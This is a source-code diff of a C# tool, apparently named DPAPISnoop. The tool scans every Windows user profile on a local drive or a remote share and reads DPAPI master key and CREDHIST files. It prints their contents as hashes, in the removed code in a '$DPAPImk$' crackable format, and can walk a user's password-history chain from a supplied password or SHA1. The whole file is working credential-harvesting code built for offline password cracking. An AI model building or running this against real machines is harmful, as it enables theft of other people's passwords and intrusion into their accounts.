@@ -1,153 +1,208 @@
-﻿using System;
+using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
-using System.Text;
 
+using static DPAPISnoop.Helpers;
+using static DPAPISnoop.Dpapi;
+using static DPAPISnoop.Credhist;
 
 namespace DPAPISnoop
 {
     internal static class Program
     {
-        public static string ByteArrayToString(byte[] ba)
+        sealed class Options
         {
-            var hex = new StringBuilder(ba.Length * 2);
-            foreach (var b in ba)
-                hex.AppendFormat("{0:x2}", b);
-            return hex.ToString();
+            public string RootDir;
+            public byte[] ChainSha1;
+            public bool CredhistOnly;
+            public bool Pre1607;
+            public string CredhistFile;
+            public string FileUsername;
         }
-        public static byte[] GetMasterKey(byte[] masterKeyBytes)
+
+        static Options ParseArgs(string[] args)
         {
-            // helper to extract domain masterkey subbytes from a master key blob
-
-            var offset = 96;
-
-            var masterKeyLen = BitConverter.ToInt64(masterKeyBytes, offset);
-            offset += 4 * 8; // skip the key length headers
-
-            var masterKeySubBytes = new byte[masterKeyLen];
-            Array.Copy(masterKeyBytes, offset, masterKeySubBytes, 0, masterKeyLen);
-
-            return masterKeySubBytes;
-        }
-        public static void Gethash(byte[] masterKeyBytes, string sid, string username, bool isDomain)
-        {
-            var mkBytes = GetMasterKey(masterKeyBytes);
-
-            var offset = 4;
-            var salt = new byte[16];
-
-            Array.Copy(mkBytes, 4, salt, 0, 16);
-            var iv = ByteArrayToString(salt);
-            //Console.WriteLine($"IV:{iv}");
-            offset += 16;
-
-            var rounds = BitConverter.ToInt32(mkBytes, offset);
-            //Console.WriteLine($"Rounds:{ rounds}");
-            offset += 4;
-
-            var algHash = BitConverter.ToInt32(mkBytes, offset);
-            //Console.WriteLine($"cipher_algo:{algHash}");
-            offset += 4;
-
-            var algCrypt = BitConverter.ToInt32(mkBytes, offset);
-            //Console.WriteLine($"hmac_algo:{algCrypt}");
-            offset += 4;
-
-            var encData = new byte[mkBytes.Length - offset];
-            Array.Copy(mkBytes, offset, encData, 0, encData.Length);
-            var cipher = ByteArrayToString(encData);
-            //Console.WriteLine($"encData:{cipher}");
-
-
-            var version = 0;
-            var hmacAlgo = "";
-            var cipherAlgo = "";
-            switch (algCrypt)
+            var options = new Options
             {
-               case 26115 when (algHash == 32777):
-                    version = 1;
-                    hmacAlgo = "sha1";
-                    cipherAlgo = "des3";
-                    break;
-               case 26128 when (algHash == 32782 || algHash == 32772):
-                    version = 2;
-                    hmacAlgo = "sha512";
-                    cipherAlgo = "aes256";
-                    break;
-                default:
-                    Console.WriteLine("unknown hash");
-                    break;
-            }
-            if(isDomain)
+                RootDir = NormalizePath(Environment.GetEnvironmentVariable("HOMEDRIVE") ?? "C:")
+            };
+
+            var positional = new List<string>();
+            for (int i = 0; i < args.Length; i++)
             {
-                //Console.WriteLine($"{username}:$DPAPImk${version}*2*{sid}*{cipher_algo}*{hmac_algo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
-                Console.WriteLine($"{username}:$DPAPImk${version}*3*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
+                string arg = args[i];
+                string flag = arg.ToLowerInvariant();
+
+                switch (flag)
+                {
+                    case "--password":
+                    case "-p":
+                        options.ChainSha1 = Sha1Password(RequireValue(args, ref i, arg));
+                        break;
+
+                    case "--sha1":
+                        options.ChainSha1 = HexToBytes(RequireValue(args, ref i, arg), "--sha1", 20);
+                        break;
+
+                    case "--credhist-file":
+                    case "--credhist":
+                        options.CredhistFile = RequireValue(args, ref i, arg);
+                        break;
+
+                    case "--username":
+                        options.FileUsername = RequireValue(args, ref i, arg);
+                        break;
+
+                    case "--credhist-only":
+                    case "-c":
+                        options.CredhistOnly = true;
+                        break;
+
+                    case "--pre1607":
+                        options.Pre1607 = true;
+                        break;
+
+                    default:
+                        if (arg.StartsWith("-"))
+                            throw new ArgumentException($"Unknown option: {arg}");
+                        positional.Add(arg);
+                        break;
+                }
             }
-            else 
-            {
-                Console.WriteLine($"{username}:$DPAPImk${version}*1*{sid}*{cipherAlgo}*{hmacAlgo}*{rounds}*{iv}*{cipher.Length}*{cipher}");
-            }
+
+            if (positional.Count > 1)
+                throw new ArgumentException("Only one root path positional argument is supported");
+            if (positional.Count == 1)
+                options.RootDir = NormalizePath(positional[0]);
+
+            return options;
         }
 
         public static void Main(string[] args)
         {
             try
             {
-                string rootDir;
+                Options options;
+                try
+                {
+                    options = ParseArgs(args);
+                }
+                catch (ArgumentException e)
+                {
+                    Console.Error.WriteLine($"[!] {e.Message}");
+                    return;
+                }
 
-                if (args.Length < 1)
+                if (options.CredhistFile != null)
                 {
-                    rootDir = Environment.GetEnvironmentVariable("HOMEDRIVE");
+                    if (!File.Exists(options.CredhistFile))
+                    {
+                        Console.Error.WriteLine($"[!] File not found: {options.CredhistFile}");
+                        return;
+                    }
+
+                    string username = options.FileUsername ?? Path.GetFileName(options.CredhistFile);
+                    byte[] credhistBytes;
+                    try
+                    {
+                        credhistBytes = File.ReadAllBytes(options.CredhistFile);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.Error.WriteLine($"[!] Cannot read {options.CredhistFile}: {e.Message}");
+                        return;
+                    }
+
+                    if (options.ChainSha1 != null)
+                        WalkCredhistChain(credhistBytes, username, options.ChainSha1);
+                    else
+                        DumpCredhistHashes(credhistBytes, username);
+
+                    Console.Error.WriteLine("[*] Done.");
+                    return;
                 }
-                else
+
+                string usersPath = options.RootDir + "\\Users";
+
+                string[] userDirs;
+                try
                 {
-                    rootDir = args[0];
-                    rootDir.TrimEnd('\\');
+                    userDirs = Directory.GetDirectories(usersPath);
                 }
-                var userDirs = Directory.GetDirectories(rootDir + "\\Users");
+                catch (UnauthorizedAccessException)
+                {
+                    Console.Error.WriteLine($"[!] Access denied listing {usersPath} - run as admin or check SMB permissions");
+                    return;
+                }
+                catch (Exception e)
+                {
+                    Console.Error.WriteLine($"[!] Cannot list {usersPath}: {e.Message}");
+                    return;
+                }
+
+                int usersScanned = 0;
+                int credhistFound = 0;
+                int totalHashes = 0;
+
                 foreach (var dir in userDirs)
                 {
-                    if (dir.EndsWith("Public") || dir.EndsWith("Default") || dir.EndsWith("Default User") || dir.EndsWith("All Users") || dir.Contains(".NET ") || dir.Contains("MSSQL$") || dir.Contains("MSSQLLFD"))
+                    string folderName = dir.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
+                    if (folderName == "Public" || folderName == "Default" ||
+                        folderName == "Default User" || folderName == "All Users" ||
+                        folderName.Contains(".NET ") || folderName.Contains("MSSQL$") ||
+                        folderName.Contains("MSSQLLFD"))
                         continue;
 
                     var userDpapiBasePath = $"{dir}\\AppData\\Roaming\\Microsoft\\Protect\\";
                     if (!Directory.Exists(userDpapiBasePath))
                         continue;
 
-                    var username = dir.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
-                    var directories = Directory.GetDirectories(userDpapiBasePath);
-                    
-                    foreach (var directory in directories)
+                    usersScanned++;
+                    var username = folderName;
+
+                    try
                     {
-                        var sid = directory.TrimEnd('\\').Split(Path.DirectorySeparatorChar).Last();
-                        var isDomain = false;
-                        var directoryInfo = new DirectoryInfo(directory);
-                        var files = directoryInfo.GetFiles();
-                        if (files.Any(x => x.Name.StartsWith("BK-")))
+                        if (!options.CredhistOnly && options.ChainSha1 == null)
+                            DumpUserMasterKeys(userDpapiBasePath, username, options.Pre1607);
+
+                        var credhistPath = userDpapiBasePath + "CREDHIST";
+                        if (File.Exists(credhistPath))
                         {
-                            isDomain = true;
-                        }
-                        foreach (var file in files.OrderByDescending(f => f.LastWriteTime))
-                        {
-                            if (file.Name.StartsWith("Preferred") || file.Name.StartsWith("BK") ||
-                                !Guid.TryParse(file.Name, out _)) continue;
-                            var masterKeyBytes = File.ReadAllBytes(file.FullName);
                             try
                             {
-                                Gethash(masterKeyBytes, sid, username, isDomain);
-                                break;
+                                var credhistBytes = File.ReadAllBytes(credhistPath);
+                                if (options.ChainSha1 != null)
+                                {
+                                    WalkCredhistChain(credhistBytes, username, options.ChainSha1);
+                                }
+                                else
+                                {
+                                    int entriesFound = DumpCredhistHashes(credhistBytes, username);
+                                    if (entriesFound > 0) { credhistFound++; totalHashes += entriesFound; }
+                                }
+                            }
+                            catch (UnauthorizedAccessException)
+                            {
+                                Console.Error.WriteLine($"[!] Access denied reading CREDHIST for {username}");
                             }
                             catch (Exception e)
                             {
-                                Console.WriteLine("[!] Error triaging {0} : {1}", file.FullName, e.Message);
+                                Console.Error.WriteLine($"[!] Error reading CREDHIST for {username}: {e.Message}");
                             }
                         }
                     }
+                    catch (Exception e)
+                    {
+                        Console.Error.WriteLine($"[!] Unexpected error processing {username}: {e.Message}");
+                    }
                 }
+
+                Console.Error.WriteLine($"[*] Done. Users scanned: {usersScanned}, users with CREDHIST: {credhistFound}, total hashes: {totalHashes}");
             }
-            catch(Exception ex) 
+            catch (Exception ex)
             {
-                Console.WriteLine($"[!] Exception happened: {ex.Message} & {ex.InnerException}");
+                Console.Error.WriteLine($"[!] Fatal exception: {ex.Message}");
             }
         }
     }
